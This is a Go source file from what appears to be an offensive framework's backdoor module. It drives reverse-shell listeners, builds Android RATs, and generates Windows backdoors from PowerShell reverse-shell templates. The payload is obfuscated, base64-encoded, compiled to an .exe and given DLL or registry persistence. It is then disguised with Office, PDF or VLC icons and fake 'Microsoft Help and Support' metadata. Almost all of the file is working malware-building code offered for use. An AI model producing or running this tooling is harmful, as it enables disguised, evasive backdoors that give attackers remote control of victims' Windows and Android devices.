package exploits

import (
    "os"
    "fmt"
    "log"
    "utils"
    "bufio"
    "bytes"
    "menus"
    "banners"
    "strings"
    "bcolors"
    "io/ioutil"
    "subprocess"
    "unicode/utf16"
    "encoding/base64"
)

var (
    userInput string
    userRhost string
    userProxy string
    userModule string
    userScript string

    userListener = "tcp"
    userIcon = "vlc"
    userLport = "9999"
    userHport = "3333"
    userC2 = "blackjack"
    userMalware  = "africana_malware"

    userLhost = userLhostIp
    scanner = bufio.NewScanner(os.Stdin)
    userLhostIp, _ = utils.GetDefaultIP()
    userCertDir, userOutPutDir, userToolsDir, userWordList = utils.DirLocations()
)

var defaultValues = map[string]string{
    "proxy": "",
    "module": "",
    "script": "",
    "icon": "vlc",
    "lport": "9999",
    "hport": "3333",
    "c2": "blackjack",
    "listener": "tcp",
    "build": "africana_malware",
    "lhost": userLhostIp,
    "output": userOutPutDir,
}

func MalwarePentest() {
    for {
        fmt.Printf("%s%safr3%s exploit(%s%s%s)%s > %s", bcolors.UNDERL, bcolors.BOLD, bcolors.ENDC, bcolors.RED, "backdoors_pentest.fn", bcolors.ENDC, bcolors.GREEN, bcolors.ENDC)
        scanner.Scan()
        userInput = strings.TrimSpace(strings.ToLower(scanner.Text()))
        buildParts := strings.Fields(userInput)
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(userInput) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeModule()
        default:
            utils.SystemShell(userInput)
        }
    }
}

func executeCommand(cmd string) bool {
    commandMap := map[string]func(){

        "? info":           menus.HelpInfo,
        "help info":        menus.HelpInfo,

        "v":                banners.Version,
        "version":          banners.Version,

        "s":                utils.Sleep,
        "sleep":            utils.Sleep,

        "o":                utils.ListJunks,
        "junks":            utils.ListJunks,
        "outputs":          utils.ListJunks,
        "clear junks":      utils.ClearJunks,
        "clear outputs":    utils.ClearJunks,

        "logs":             subprocess.LogHistory,
        "history":          subprocess.LogHistory,
        "clear logs":       subprocess.ClearHistory,
        "clear history":    subprocess.ClearHistory,

        "? run":            menus.HelpInfoRun,
        "h run":            menus.HelpInfoRun,
        "info run":         menus.HelpInfoRun,
        "help run":         menus.HelpInfoRun,
        "? use":            menus.HelpInfoRun,
        "h use":            menus.HelpInfoRun,
        "info use":         menus.HelpInfoRun,
        "help use":         menus.HelpInfoRun,
        "? exec":           menus.HelpInfoRun,
        "h exec":           menus.HelpInfoRun,
        "info exec":        menus.HelpInfoRun,
        "help exec":        menus.HelpInfoRun,
        "? start":          menus.HelpInfoRun,
        "h start":          menus.HelpInfoRun,
        "info start":       menus.HelpInfoRun,
        "help start":       menus.HelpInfoRun,
        "? launch":         menus.HelpInfoRun,
        "h launch":         menus.HelpInfoRun,
        "info launch":      menus.HelpInfoRun,
        "help launch":      menus.HelpInfoRun,
        "? exploit":        menus.HelpInfoRun,
        "h exploit":        menus.HelpInfoRun,
        "info exploit":     menus.HelpInfoRun,
        "help exploit":     menus.HelpInfoRun,
        "? execute":        menus.HelpInfoRun,
        "h execute":        menus.HelpInfoRun,
        "info execute":     menus.HelpInfoRun,
        "help execute":     menus.HelpInfoRun,

        "set":              menus.HelpInfoSet,
        "h set":            menus.HelpInfoSet,
        "info set":         menus.HelpInfoSet,
        "help set":         menus.HelpInfoSet,

        "tips":             menus.HelpInfoTips,
        "h tips":           menus.HelpInfoTips,
        "? tips":           menus.HelpInfoTips,
        "info tips":        menus.HelpInfoTips,
        "help tips":        menus.HelpInfoTips,

        "show":             menus.HelpInfoShow,
        "? show":           menus.HelpInfoShow,
        "h show":           menus.HelpInfoShow,
        "info show":        menus.HelpInfoShow,
        "help show":        menus.HelpInfoShow,

        "info list":        menus.HelpInfoList,
        "help list":        menus.HelpInfoList,
        "use list":         menus.HelpInfoList,
        "list":             menus.HelpInfoList,

        "? options":        menus.HelpInfOptions,
        "info options":     menus.HelpInfOptions,
        "help options":     menus.HelpInfOptions,

        "banner":           banners.RandomBanners,
        "g":                utils.BrowseTutarilas,
        "t":                utils.BrowseTutarilas,
        "guide":            utils.BrowseTutarilas,
        "tutarial":         utils.BrowseTutarilas,
        "h":                menus.HelpInfoMenuZero,
        "?":                menus.HelpInfoMenuZero,
        "00":               menus.HelpInfoMenuZero,
        "help":             menus.HelpInfoMenuZero,
        "f":                menus.HelpInfoFeatures,
        "use f":            menus.HelpInfoFeatures,
        "features":         menus.HelpInfoFeatures,
        "use features":     menus.HelpInfoFeatures,

        //Chameleons//
        "info":             menus.HelpInfoExploits,

        "m":                menus.MenuFour,
        "menu":             menus.MenuFour,

        "option":           menus.HelpInfOptions,
        "options":          menus.HelpInfOptions,
        "show option":      menus.HelpInfOptions,
        "show options":     menus.HelpInfOptions,

        "modules":          menus.ListMainModules,
        "show all":         menus.ListMainModules,
        "list all":         menus.ListMainModules,
        "list modules":     menus.ListMainModules,
        "show modules":     menus.ListMainModules,
    }
    if action, exists := commandMap[cmd]; exists {
        action()
        return true
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{
        "c2": &userC2,
        "proxy": &userProxy,
        "lhost": &userLhost,
        "lport": &userLport,
        "hport": &userHport,
        "script": &userScript,
        "build": &userMalware,
        "module": &userModule,
        "output": &userOutPutDir,
        "listener": &userListener,
    }
    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{
        "c2": &userC2,
        "proxy": &userProxy,
        "lhost": &userLhost,
        "lport": &userLport,
        "hport": &userHport,
        "script": &userScript,
        "build": &userMalware,
        "module": &userModule,
        "output": &userOutPutDir,
        "listener": &userListener,
    }
    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
    } else {
        menus.HelpInfoSet()
    }
}

func executeModule() {
    if userModule == "" {
        fmt.Printf("\n%s[!] %sMODULE not set. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    MalwarePenModules(userModule, userLhost, userLport, userHport, userListener, userC2, userMalware)
}

func MalwarePenModules(userModule string, args ...interface{}) {
    if userProxy != "" {
        fmt.Printf("PROXIES => %s\n", userProxy)
        utils.SetProxy(userProxy)
    }

    commands := map[string]func(){
        "havoc":      func() {Havoc()},
        "shellz":     func() {Shellz()},
        "seashell":   func() {SeaShell()},
        "meterpeter": func() {MeterPeter()},
        "ncat":       func() {Ncat(userLport, userListener)},
        "powerjoker": func() {PowerJoker(userLhost, userLport, userToolsDir)},
        "teardroid":  func() {TearDroid(userMalware, userToolsDir, userOutPutDir)},
        "metasploit": func() {Metasploit(userLhost, userLport, userListener)},
        "ghost":      func() {Gh0x0st(userMalware, userToolsDir, userScript, userOutPutDir)},
        "androrat":   func() {AndroRat(userLhost, userLport, userMalware, userToolsDir, userOutPutDir)},
        "blackjack":  func() {BlackJack(userLhost, userLport, userHport, userListener, userToolsDir)},
        "noisemaker" :func() {NoiseMakers(userToolsDir, userLport, userHport, userListener, userScript, userIcon, userC2)},
        "codebreaker":func() {CodeBreakers(userToolsDir, userLport, userHport, userListener, userScript, userIcon , userC2)},
    }

    if action, exists := commands[userModule]; exists {
        action()
    } else {
        fmt.Printf("\n%s[!] %sMODULE %s is invalid. Use %s'help' %sfor available modules.\n", bcolors.YELLOW, bcolors.ENDC, userModule, bcolors.DARKGREEN, bcolors.ENDC)
    }
}


func Havoc() {
    subprocess.Popen(`havoc client & havoc server -d -v`)
    fmt.Println()
}

func Shellz() {
    subprocess.Popen(`cd %s/exploits/windows/shells/; bash shells.sh`, userToolsDir)
}

func SeaShell() {
    subprocess.Popen(`cd %s/exploits/mackos/seashell/; python3 sea_shell.py`, userToolsDir)
}

func MeterPeter() {
    subprocess.Popen(`cd %s/exploits/windows/meterpeter/; pwsh meterpeter.ps1`, userToolsDir)
}

func TearDroid(userMalware string, userToolsDir string, userOutPutDir string) {
    fmt.Printf("\nBUILD => %s.apk\nOUTPUT => %s\n\n", userMalware, userOutPutDir)
    subprocess.Popen(`cd %s/exploits/androids/teardroid/; python3 Teardroid.py -b %s`, userToolsDir, userMalware)
}

func AndroRat(userLhost string, userLport string, userMalware string, userToolsDir string, userOutPutDir string) {
    filePath := "/usr/bin/zipalign.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana; apt-get install %s/exploits/androids/androrat/zipalign_8.1.0.deb --allow-downgrades -y`, userToolsDir)
    }
    fmt.Printf("\nLHOST => %s\nLPORT => %s\nBUILD => %s.apk\nOUTPUT => %s\n\n", userLhost, userLport, userMalware, userOutPutDir)
    subprocess.Popen(fmt.Sprintf("cd %s/exploits/androids/androrat/; python3 androrat.py --build -i %s -p %s -o %s/%s.apk", userToolsDir, userLhost, userLport, userOutPutDir, userMalware))
    subprocess.Popen(fmt.Sprintf("cd %s/exploits/androids/androrat/; python3 androrat.py --shell -i %s -p %s", userToolsDir, userLhost, userLport))
}

func Chameleon(userMalware string, userToolsDir string, userScript string, userOutPutDir string) {
    if userScript == "" {
        fmt.Printf("\n%s[!] %s SCRIPT location not set. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s\n\n", userMalware, userScript, userOutPutDir)
    subprocess.Popen(`cd %s/exploits/windows/chameleon/; python3 chameleon.py -f -s --verbose %s -o %s/%s`, userToolsDir, userScript, userOutPutDir, userMalware)

}

func Gh0x0st(userMalware string, userToolsDir string, userScript string, userOutPutDir string) {
    if userScript == "" {
        fmt.Printf("\n%s[!] %s SCRIPT location not set. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s\n\n", userMalware, userScript, userOutPutDir)
    subprocess.Popen(`cd %s/exploits/windows/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o /%s"`, userToolsDir, userScript, userOutPutDir, userMalware)
}

func PowerJoker(userLhost string, userLport string, userToolsDir string) {
    fmt.Printf("\nLHOST => %s\nLPORT => %s\n\n", userLhost, userLport)
    subprocess.Popen(`cd %s/exploits/windows/joker/; python3 joker.py -l %s -p %s`, userToolsDir, userLhost, userLport)
}

func BlackJack(userLhost string, userLport string, userHport string, userListener string, userToolsDir string) {
    switch strings.ToLower(userListener) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nLISTENER => %s\n\n", userLhost, userLport, userListener)
        subprocess.Popen("cd %s/exploits/windows/blackjack/; python3 blackjack.py -q -i -n %s\n", userToolsDir, userLport)
    case "https", "http":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nLISTENER => %s\n\n", userLhost, userLport, userHport, userListener)
        subprocess.Popen("cd %s/exploits/windows/blackjack/; python3 blackjack.py -q -i -c /root/.afr3/certs/africana-cert.pem -k /root/.afr3/certs/africana-key.pem -x %s -n %s", userToolsDir, userLport, userHport)
        fmt.Println()
    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "Error: Invalid LISTENER type")
    }
}

func Ncat(userLport string, userListener string) {
    switch strings.ToLower(userListener) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nLISTENER => %s\n\n", userLhost, userLport, userListener)
        subprocess.Popen(`rlwrap ncat -lnvp %s`, userLport)
    case "https", "http":
         fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nLISTENER => %s\n\n", userLhost, userLport, userHport, userListener)
         subprocess.Popen(`rlwrap ncat --ssl --ssl-key %s/africana-key.pem --ssl-cert %s/africana-cert.pem -lnvp %s`, userLport, userCertDir, userCertDir)
    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "Error: Invalid LISTENER type")
    }
}

func Metasploit(userLhost string, userLport string, userListener string) {
    switch strings.ToLower(userListener) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nLISTENER => %s\n\n", userLhost, userLport, userListener)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, userLhost, userLport)
    case "http", "https":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nLISTENER => %s\n\n", userLhost, userLport, userListener)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, userLhost, userLport)
    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "Error: Invalid LISTENER type")
    }
}

func ShikataGanai(userToolsDir string, userLport string, userHport string, userListener string, userScript string, userC2 string) {
    fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nICON => %s\nLISTENER => %s\nC2 => %s\n", userLhost, userLport, userHport, userIcon, userListener, userC2)
    switch strings.ToLower(userListener) {
    case "tcp":
        subprocess.Popen(`cp -r %s/exploits/windows/payload_templates/ncat_exploits/powershell_reverse_tcp.ps1 %s/powershell_reverse_tcp.txt`, userToolsDir, userOutPutDir)
        filesToReplacements := map[string]map[string]string{
            "/root/.afr3/output/powershell_reverse_tcp.txt": {
            `*LHOST*`: userLhost,
            `*LPORT*`: userLport,
            },
        }
        fmt.Println()
        utils.Editors(filesToReplacements)
        userScript := `/root/.afr3/output/powershell_reverse_tcp.txt`
        userOutPutDir := `/root/.afr3/output/powershell_reverse_tcp.ps1`
        subprocess.Popen(`cd %s/exploits/windows/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`,userToolsDir, userScript, userOutPutDir)

        filePath := "/root/.afr3/output/powershell_reverse_tcp.ps1"
        content, err := ioutil.ReadFile(filePath)
        if err != nil {
            fmt.Printf("Error reading file: %v\n", err)
            return
        }

        utf16Content := utf16.Encode([]rune(string(content)))
        buf := new(bytes.Buffer)
        for _, v := range utf16Content {
            buf.Write([]byte{byte(v), byte(v >> 8)})
        }

        encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
        subprocess.Popen(`cp -r /root/.afr3/africana-base/exploits/windows/payload_templates/go_exploits/malware_complete.go /root/.afr3/output/malware_complete.go`)
        Replacement := map[string]map[string]string{
            "/root/.afr3/output/malware_complete.go": {
            `africana`: encoded,
            },
        }
        utils.Editors(Replacement)
        fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Encoding payload to base64 ...\n" + bcolors.DARKGREY + "powershell -w 1 -enc '%s'\n" + bcolors.ENDC, encoded)
        fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Converting base64 payload to executable ...\n" + bcolors.DARKGREEN)
        subprocess.Popen("GOOS=windows GOARCH=amd64 go build -v -x -o /root/.afr3/output/malware_complete.exe /root/.afr3/output/malware_complete.go")
        fmt.Println()

    case "http", "https":
        subprocess.Popen(`cp -r %s/exploits/windows/payload_templates/ncat_exploits/powershell_reverse_http.ps1 %s/powershell_reverse_http.txt`, userToolsDir, userOutPutDir)
        filesToReplacements := map[string]map[string]string{
            "/root/.afr3/output/powershell_reverse_http.txt": {
            `*LHOST*`: userLhost,
            `*LPORT*`: userLport,
            },
        }
        fmt.Println()
        utils.Editors(filesToReplacements)
        userScript := `/root/.afr3/output/powershell_reverse_http.txt`
        userOutPutDir := `/root/.afr3/output/powershell_reverse_http.ps1`
        subprocess.Popen(`cd %s/exploits/windows/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o /%s"`,userToolsDir, userScript, userOutPutDir)

        filePath := "/root/.afr3/output/powershell_reverse_http.ps1"
        content, err := ioutil.ReadFile(filePath)
        if err != nil {
            fmt.Printf("Error reading file: %v\n", err)
            return
        }

        utf16Content := utf16.Encode([]rune(string(content)))
        buf := new(bytes.Buffer)
        for _, v := range utf16Content {
            buf.Write([]byte{byte(v), byte(v >> 8)})
        }

        encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
        subprocess.Popen(`cp -r %s/exploits/windows/payload_templates/go_exploits/malware_complete.go %s/malware_complete.go`, userToolsDir, userOutPutDir)
        filesToReplace := map[string]map[string]string{
            "/root/.afr3/output/malware_complete.go": {
            `africana`: encoded,
            },
        }
        utils.Editors(filesToReplace)
        fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Encoding payload to base64 ...\n" + bcolors.DARKGREY + "powershell -w 1 -enc '%s'\n" + bcolors.ENDC, encoded)
        fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Converting base64 payload to executable ...\n" + bcolors.DARKGREEN)
        subprocess.Popen("GOOS=windows GOARCH=amd64 go build -v -x -o /root/.afr3/output/malware_complete.exe /root/.afr3/output/malware_complete.go")
        fmt.Println()

    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "LISTENER %s not found. Try help command ...", userListener)
    }
}

func IconChanger(userIcon string) {
    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Disguising backdoor with %s icon ...\n", userIcon)
    switch strings.ToLower(userIcon) {
    case "lync":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/lync.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "excel":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/excel.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "access":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/access.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "autorun":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/autorun.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "pdf":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/pdf.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "project":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/project.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "publisher":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/publisher.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "powerpoint":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/powerpoint.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "rat":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/rat.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "vlc":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/vlc.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "word":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/word.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "visio":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/visio.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    default:
        utils.SystemShell(userInput)
    }
}

 //dll persistence mechanisim//
func NoiseMakers(userToolsDir string, userLport string, userHport string, userListener string, userScript string, userIcon string, userC2 string) {
    ShikataGanai(userToolsDir, userLport, userHport, userListener, userScript, userC2)
    dllFilePath := "/root/.afr3/africana-base/exploits/windows/payload_templates/injected_dlls/Secur32.dll"
    exeFilePath := "/root/.afr3/output/malware_complete.exe"

    dllData, err := ioutil.ReadFile(dllFilePath)
    if err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed reading binary file: %s", err)
    }

    exeData, err := ioutil.ReadFile(exeFilePath)
    if err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)
    encodedDll := base64.StdEncoding.EncodeToString(dllData)

    subprocess.Popen(`cp -r %s/exploits/windows/payload_templates/go_exploits/malware_runner_dll.go %s/malware_runner_dll.go`, userToolsDir, userOutPutDir)
    filesToReplacements := map[string]map[string]string{
        "/root/.afr3/output/malware_runner_dll.go": {
        "africanas": encodedExe,
        `africanax`: encodedDll,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.afr3/output/malware_runner_dll.go"
    endMalwarePath := "/root/.afr3/output/africana_backdoor.exe"

    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "hooking .exe with .dll for persistence!\n" + bcolors.DARKGREEN)

    buildCmd := "go build -v -x -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)

    IconChanger(userIcon)
    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Launching %sc2 ...", userC2)
    switch strings.ToLower(userC2) {
    case "ncat":
        Ncat(userLport, userListener)
        return
    case "blackjack":
        BlackJack(userLhost, userLport, userHport, userListener, userToolsDir)
        return
    case "metasploit":
        Metasploit(userLhost, userLport, userListener)
        return
    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "LISTENER %s not found. Try help command ...", userListener)
    }
    log.Printf(bcolors.GREEN + "\n[+] " + bcolors.ENDC + "complete backdoor saved at: " + bcolors.BLUE + "%s", endMalwarePath + bcolors.ENDC)
}

//regestry persistence mechanisim//
func CodeBreakers(userToolsDir string, userLport string, userHport string, userListener string, userScript string, userIcon string, userC2 string) {
    ShikataGanai(userToolsDir, userLport, userHport, userListener, userScript, userC2)

    exeFilePath := "/root/.afr3/output/malware_complete.exe"
    exeData, err := ioutil.ReadFile(exeFilePath)

    if err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)

    subprocess.Popen(`cp -r %s/exploits/windows/payload_templates/go_exploits/malware_runner_reg.go %s/malware_runner_reg.go`, userToolsDir, userOutPutDir)
    filesToReplacements := map[string]map[string]string{
        "/root/.afr3/output/malware_runner_reg.go": {
        "africanas": encodedExe,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.afr3/output/malware_runner_reg.go"
    endMalwarePath := "/root/.afr3/output/africana_backdoor.exe"
    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "hooking .exe with .dll for persistence!\n" + bcolors.DARKGREEN)
    buildCmd := "go build -v -x -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)
    IconChanger(userIcon)
    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Launching %s c2 ...", userC2)
    switch strings.ToLower(userC2) {
    case "ncat":
        Ncat(userLport, userListener)
        return
    case "blackjack":
        BlackJack(userLhost, userLport, userHport, userListener, userToolsDir)
        return  
    case "metasploit":
        Metasploit(userLhost, userLport, userListener)
        return
    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "Error: Invalid LISTENER type")
    }
    log.Printf(bcolors.GREEN + "\n[+] " + bcolors.ENDC + "complete backdoor saved at: " + bcolors.BLUE + "%s", endMalwarePath + bcolors.ENDC)
}
